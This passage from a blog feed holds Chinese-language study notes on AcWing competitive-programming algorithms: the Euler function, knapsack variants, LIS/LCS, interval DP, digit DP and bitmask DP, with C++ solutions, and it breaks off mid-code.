<h2 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h2><p><strong>disk</strong> <em>– n.</em> a flat, round object</p>
<p><strong>impressive</strong> <em>– adj.</em> something considered noteworthy or causing admiration or respect</p>
<p><strong>upgrade</strong> <em>– n.</em> to improve something that is higher quality of a newer model</p>
]]></content>
      <categories>
        <category>VOA</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>VOA</tag>
      </tags>
  </entry>
  <entry>
    <title>Acwingnotes</title>
    <url>/ACM/acwingnotes/2024/02/07/</url>
    <content><![CDATA[<h1 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h1><h2 id="欧拉函数-euler-function"><a href="#欧拉函数-euler-function" class="headerlink" title="欧拉函数(euler function )"></a>欧拉函数(euler function )</h2><p>旨在求出一个数n的1-n中与n互质的数的个数<br>1.首先从1-N中去掉p1,p2,….pk的所有的倍数 2.加上所有pi*pj的倍数,因为减重复了 3.减去所有pi*pj*pk的倍数……(利用的是容斥原理)<br><strong>时间复杂度</strong>根号n分解质因数的时间复杂度是根号n</p>
<h1 id="DP-动态规划"><a href="#DP-动态规划" class="headerlink" title="DP(动态规划)"></a>DP(动态规划)</h1><blockquote>
<p>性质(动态规划和递推的区别)</p>
<p>递推求出的是数据，所以只是针对数据进行操作；而动态规划求出的是最优状态，所以必然也是针对状态的操作，而状态自然可以出现在最优解中，也可以不出现——这便是决策的特性（布尔性）。</p>
<p>其次，由于每个状态均可以由之前的状态演变形成，所以动态规划有可推导性，但同时，动态规划也有无后效性，即每个当前状态会且仅会决策出下一状态，而不直接对未来的所有状态负责，可以浅显的理解为——</p>
<p><strong>Future  never  has  to  do  with  past  time  ,but  present  does.</strong><br>现在决定未来，未来与过去无关</p>
</blockquote>
<h2 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h2><p>背包问题:状态表示和状态计算</p>
<h3 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h3><h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h3><p><strong>状态转移方程推导</strong></p>
<p>f[i,j]&#x3D;max  (f[i-1,j],  f[i-1,j-v]+w,   f[i-1,j-2v]+2w…f[i-1,j-sv]+sw)&#x2F;&#x2F;s&#x3D;j&#x2F;v</p>
<p>f[i,j-v]&#x3D;max(f[i-1,j-v],f[i-1,j-2v]+w…f[i-1,j-sv]+(s-1)w);&#x2F;&#x2F;s&#x3D;j&#x2F;v</p>
<p> 故:<strong>f[i,j]&#x3D;max(f[i-1,j],f[i,j-v]+w);</strong></p>
<h4 id="完全背包问题的优化"><a href="#完全背包问题的优化" class="headerlink" title="完全背包问题的优化"></a>完全背包问题的优化</h4><p>对数据进行取舍,选物美价廉的商品,排除大于容量的商品</p>
<p>规律总结:</p>
<ul>
<li>当空间优化成为1维时只有完全背包的体积时<strong>从小到大循环的</strong></li>
<li>for物品,for体积,for决策</li>
</ul>
<h3 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a>多重背包</h3><p>f[i,j]&#x3D;max(f[i-1,j],f[i-1,j-v]+w,f[i-1,j-2v]+2w…f[i-1,j-sv]+sw)</p>
<p>f[i,j-v]&#x3D;max(f[i-1,j-v],f[i-1,j-2v]+w…f[i-1,j-sv]+(s-1)w,f[i-1,j-(s+1)v]+sw);</p>
<h4 id="二进制优化"><a href="#二进制优化" class="headerlink" title="二进制优化"></a>二进制优化</h4><p>可以一边读入一遍运算</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= c;k*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * k;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * k] + k * b);</span><br><span class="line">             c -= k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c)&#123;<span class="comment">//多出来的01背包跑一次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * c;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * c] + b * c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; f[m];</span><br></pre></td></tr></table></figure>

<h4 id="单调队列优化背包"><a href="#单调队列优化背包" class="headerlink" title="单调队列优化背包"></a>单调队列优化背包</h4><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251369.png" alt="image-20240121173812647"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">dp[kv+j]      =<span class="built_in">max</span>( dp[(k<span class="number">-1</span>)v+j] + w , dp[(k<span class="number">-2</span>)v+j] + <span class="number">2</span>w , ... , dp[<span class="number">3</span>v+j] + (k<span class="number">-3</span>)w , dp[<span class="number">2</span>v+j] + (k<span class="number">-2</span>)w , dp[v+j] + (k<span class="number">-1</span>)w , dp[j] + kw )</span><br><span class="line">dp[(k<span class="number">-1</span>)v+j]=<span class="built_in">max</span>( dp[(k<span class="number">-2</span>)v+j] + w , ... , dp[<span class="number">3</span>v+j] + (k<span class="number">-4</span>)w , dp[<span class="number">2</span>v+j] + (k<span class="number">-3</span>)w , dp[v+j] + (k<span class="number">-2</span>)w , dp[j] + (k<span class="number">-1</span>)w )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><a href="https://www.cnblogs.com/BingweiHuang/p/15976681.html">单调队列优化dp参考文章</a></p>
<p>示例代码:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 多重背包问题： 限制每种物品可取次数</span></span><br><span class="line"><span class="comment">// 究极优化：单调队列</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">20010</span>, N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> dp[M], g[M];</span><br><span class="line"><span class="type">int</span> que[M]; <span class="comment">// 队列只存储在同余的集合中是第几个，不存储对应值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)<span class="comment">//读入n个种类</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v, w, s;</span><br><span class="line">        cin &gt;&gt; v &gt;&gt; w &gt;&gt; s;<span class="comment">//体积,价值和所选的个数</span></span><br><span class="line">        <span class="comment">// 复制一份副本g，因为这里会是从小到大，不能像0-1背包那样从大到小，所以必须申请副本存i-1状态的，不然会被影响</span></span><br><span class="line">        <span class="built_in">memcpy</span>(g, dp, <span class="keyword">sizeof</span> dp);<span class="comment">//是从前一次转换</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> r = <span class="number">0</span>; r &lt; v; r++)</span><br><span class="line">        &#123; <span class="comment">// 因为只有与v同余的状态 相互之间才会影响，余0,1,...,v-1 分为v组</span></span><br><span class="line">            <span class="type">int</span> head = <span class="number">0</span>, tail = <span class="number">-1</span>;<span class="comment">//head是对头,tail是队尾</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; r + k * v &lt;= m; k++)<span class="comment">//同一组内便利每一个k,k为同余下的倍数.</span></span><br><span class="line">            &#123; <span class="comment">// 每一组都进行处理，就相当于对所有状态都处理了</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">//  队头不在窗口里面就踢出（队头距离要更新的dp超过了最大个数s，尽管它再大也要舍去，因为达不到）</span></span><br><span class="line">                <span class="keyword">if</span> (head &lt;= tail &amp;&amp; k - que[head] &gt;= s+<span class="number">1</span>)<span class="comment">//比如s=2,那么[3v+j]只能从[v+j]和[2v+j]转移得到,所以区间长度要小于等于s+1</span></span><br><span class="line">                    head++;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 这第k个准备进来，把不大于它的队尾统统踢掉，也是为了保持队列的单调降（判断式实际上是两边同时减去了k * w）</span></span><br><span class="line">                <span class="comment">// 实际意义应该是 g[r + k * v]+(k-k)*w &gt;= g[r + que[tail] * v] + (k - que[tail]) * w 为判断条件</span></span><br><span class="line">                <span class="keyword">while</span> (head &lt;= tail &amp;&amp; g[r + k * v] - k * w &gt;= g[r + que[tail] * v] - que[tail] * w)</span><br><span class="line">                    tail--;</span><br><span class="line"></span><br><span class="line">                que[++tail] = k; <span class="comment">// 将第k个入列，队列只存储在同余中是第几个，不存储对应值</span></span><br><span class="line">                <span class="comment">// 余r的这组的第k个取队头更新，队头永远是使之max的决策</span></span><br><span class="line">                dp[r + k * v] = g[r + que[head] * v] + (k - que[head]) * w;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[m] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二维费用的背包问题"><a href="#二维费用的背包问题" class="headerlink" title="二维费用的背包问题"></a>二维费用的背包问题</h3><p>状态的含义要根据题目做出实际的调整</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251380.png" alt="image-20240126125454341"></p>
<p>在做Acwing的潜水员那道题目时,解法不通</p>
<h2 id="线性dp"><a href="#线性dp" class="headerlink" title="线性dp"></a>线性dp</h2><h3 id="数字三角形-入门"><a href="#数字三角形-入门" class="headerlink" title="数字三角形(入门)"></a>数字三角形(入门)</h3><p><strong>动态规划思路分析1. 状态表示(集合和集合的属性(Max||Min)) 2.状态计算(状态转移方程)</strong><br>动态规划时间复杂度:状态数量*转移的计算量<br><em>注意点</em> (多做题,积累经验)<br>1.初始化要考虑边界问题,每行多初始化一个<br>2.题目要求要从最上层到最底层的最大路径,要考虑到数字可以为负数(故要初始化为-∞)<br><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251388.png" alt="Alt text"></p>
<h3 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h3><p><strong>(求的是数值严格单调递增的子序列最大长度)</strong> </p>
<p>集合:所有以第i个数字结尾的上升子序列 属性:所有以该数字结尾的最大序列的最大长度<br>状态转移方程:(以第i-1个数字来分类)(分类方式是难点)<br><strong>最长上升子序列优化版本</strong> </p>
<p>设 dp[i] 表示长度为 i 的最长上升子序列的末尾元素的最小值，显然这个数组的权值一定单调不降。于是我们按顺序枚举数组nums，每一次对dp数组二分查找，找到小于nums[i]的最大的 dp[j]，并更新 dp[j+1]。</p>
<h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><p><strong>(给模式串A和B,求出又是A的子序列又是B的子序列的最长序列)</strong></p>
<p>1.状态表示两纬dp[i,j]  (所有由第一个序列的前i个字母和第二个序列的前j个字母构成的子序列)<br>其分的四个类虽然有重叠,但没有遗漏,dp[i,j]表示的是考虑第一个序列前i个,第二个序列前j个出现的子序列但a[i],b[j]只是以这两个结尾的子序列,并且这四个类中第二三个类可以把第一个彻底涵盖,故在平常只写三种情况的dp<br><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251401.png" alt="Alt text"></p>
<h3 id="最长公共上升子序列"><a href="#最长公共上升子序列" class="headerlink" title="最长公共上升子序列"></a>最长公共上升子序列</h3><blockquote>
<p>在序列A，B都存在的上升子序列并且最长的上升序列</p>
</blockquote>
<p>属性：f[i,j],表示所有由A的前i个字母和B的前j个字母构成的，以b[j]结尾的公共上升子序列</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251412.png" alt="image-20240116100920887"></p>
<h4 id="朴素代码"><a href="#朴素代码" class="headerlink" title="朴素代码"></a>朴素代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3010</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[N], b[N], f[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n;j++)&#123;</span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i][j],f[i - <span class="number">1</span>][j]);</span><br><span class="line">            <span class="keyword">if</span>(a[i]==b[j])&#123;</span><br><span class="line">                <span class="comment">//枚举下空集</span></span><br><span class="line">                f[i][j] = <span class="built_in">max</span>(f[i][j], <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; j;k++)</span><br><span class="line">                    <span class="keyword">if</span>(b[j]&gt;b[k])</span><br><span class="line">                    f[i][j] = <span class="built_in">max</span>(f[i][j], f[i][k] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, f[n][i]);</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251421.png" alt="image-20240116110204233"></p>
<h4 id="优化代码"><a href="#优化代码" class="headerlink" title="优化代码"></a>优化代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3010</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[N], b[N], f[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> maxv = <span class="number">1</span>;<span class="comment">//同步更新前j的最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n;j++)&#123;</span><br><span class="line">            f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(a[i]==b[j])</span><br><span class="line">                f[i][j] = <span class="built_in">max</span>(f[i][j], maxv);</span><br><span class="line">            <span class="keyword">if</span>(b[j]&lt;a[i])</span><br><span class="line">                maxv = <span class="built_in">max</span>(maxv, f[i][j] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, f[n][i]);</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="区间dp-石子合并"><a href="#区间dp-石子合并" class="headerlink" title="区间dp-石子合并"></a>区间dp-石子合并</h3><p>(将n堆石子合并为一堆,每次合并相邻两堆石子,合并的代价是两堆石子的质量和,求最小代价)(0(n^3))</p>
<p>集合:所有将第i堆到第j堆石子合并成一堆石子的合并方式,将这么多方式分成k类,是将每一类的最小代价取min<br>转移方程</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">dp[l][r]=<span class="built_in">min</span>(dp[l][r],dp[l][k]+dp[k+<span class="number">1</span>][r]+s[r]-s[l<span class="number">-1</span>]);<span class="comment">//其中k是起到中介作用,将大区间划分成小区间</span></span><br></pre></td></tr></table></figure>
<p>从小区间开始枚举,k充当的是划分区间的作用,将大区间划分成小区间,通过循环一直更新,递推,最后更新到dp[1][n];<br>要记住k是从i开始,到r-1结束,因为要保证k是第l到r之间的一个分割点</p>
<h3 id="最短编辑距离-n-2"><a href="#最短编辑距离-n-2" class="headerlink" title="最短编辑距离 (n^2)"></a>最短编辑距离 (n^2)</h3><p>集合:所有将a[1-i]变成b[1-j]的操作方式,以空间换时间<br>dp[i][j]表示的是将a的前i个字符变成b的前j个字符需要的最少操作次数,有三种类<br><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251430.png" alt="Alt text"></p>
<h2 id="计数类dp"><a href="#计数类dp" class="headerlink" title="计数类dp"></a>计数类dp</h2><h3 id="整数划分-将一个正整数划分成多个正整数之和-不考虑顺序-求划分方式"><a href="#整数划分-将一个正整数划分成多个正整数之和-不考虑顺序-求划分方式" class="headerlink" title="整数划分(将一个正整数划分成多个正整数之和(不考虑顺序)求划分方式)"></a>整数划分(将一个正整数划分成多个正整数之和(不考虑顺序)求划分方式)</h3><p>集合:f[i,j]从1-i中选,符合数量为j的选法,可以看作是完全背包问题</p>
<p>(数位dp)<br>计数问题:统计[a-b]中[0-9]出现的次数<br><strong>分情况讨论</strong><del>感觉分情况讨论在哪都是一种好的思维方式</del> 转化成一个count(n,x),求1-n中x出现的次数 前缀和思路{count(b,x)-count(a-1,x)};x取遍0-9,<br><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251440.png" alt="Alt text">  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(vector&lt;<span class="type">int</span>&gt; num,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = l; i &gt;= r;i--)</span><br><span class="line">        res = res * <span class="number">10</span> + num[i];</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        <span class="comment">//返回第l到r之间位数的数字</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power10</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(x--)</span><br><span class="line">        res *= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">    <span class="comment">//算10的x次方</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!n)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; num;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        num.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n = num.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span> - !x; i &gt;= <span class="number">0</span>;i--)&#123;<span class="comment">//要是是数0的位数,那首位肯定没有0</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;n<span class="number">-1</span>)<span class="comment">//防止首位</span></span><br><span class="line">        &#123;</span><br><span class="line">            res += (<span class="built_in">get</span>(num, n - <span class="number">1</span>, i + <span class="number">1</span>)-(!x)) * <span class="built_in">power10</span>(i);<span class="comment">//特判一下0的情况</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num[i]==x)</span><br><span class="line">            res += <span class="built_in">get</span>(num, i - <span class="number">1</span>, <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(num[i]&gt;x)</span><br><span class="line">            res += <span class="built_in">power10</span>(i);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;a&gt;&gt;b,a||b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">            <span class="built_in">swap</span>(a, b);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>;i++)</span><br><span class="line">            cout &lt;&lt; <span class="built_in">count</span>(b, i) - <span class="built_in">count</span>(a - <span class="number">1</span>, i) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="状压dp"><a href="#状压dp" class="headerlink" title="状压dp"></a>状压dp</h2><h3 id="蒙德里安的梦想"><a href="#蒙德里安的梦想" class="headerlink" title="蒙德里安的梦想:"></a>蒙德里安的梦想:</h3><p> <strong>dp[i][j],所有摆到了第i列,,上一列伸出的小正方形为j(通过二进制表示每一行)的所有方案数</strong> </p>
<p>方程:要判断上一个状态能否转移<br>条件一: 从i-1列升到i列与i-2列升到i-1列不冲突,及(k&amp;j&#x3D;&#x3D;0)<br>条件二: j^k不存在连续奇数个0;(可以预处理)</p>
<p>f[i,j]表示的是从i-1行开始,的横着的小木块,捅到i行的状态表示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计把n*m的矩形切成若干个1*2的小矩形,问有多少种方案</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M = <span class="number">1</span> &lt;&lt; N;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ll;</span><br><span class="line">ll dp[N][M];</span><br><span class="line"><span class="type">bool</span> st[M];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m,n||m)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span> dp);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">            st[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;&gt;j &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                        st[i] = <span class="literal">false</span>;</span><br><span class="line">                    cnt = <span class="number">0</span>;<span class="comment">//当碰到为1的点时,不管cnt是不是奇数,都要清零</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cnt++;&#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt&amp;<span class="number">1</span>)</span><br><span class="line">                st[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="comment">//就是把中间空余部分为奇数的情况标记一下</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span> &lt;&lt; n;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">1</span> &lt;&lt; n;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>((j&amp;k)==<span class="number">0</span>&amp;&amp;st[j|k])&#123;</span><br><span class="line">                        dp[i][j] += dp[i - <span class="number">1</span>][k];<span class="comment">//状态转移方程</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; dp[m][<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="hamilton最短路径"><a href="#hamilton最短路径" class="headerlink" title="hamilton最短路径"></a>hamilton最短路径</h3><p>算是二维的状态压缩dp,以二进制表示所有经过的点 (用一个整数,表示一个所有的状态,但最多到20个表示)<br>dp[i][j]表示从0-j,中间走过的所有点是i,i表示的是一种状态,通过20位二进制数的0&#x2F;1组合来达到走过和没走过的效果<br>要取最小值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">21</span>;</span><br><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> f[<span class="number">1</span> &lt;&lt; N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            cin &gt;&gt; g[i][j];</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> f);</span><br><span class="line">    f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span 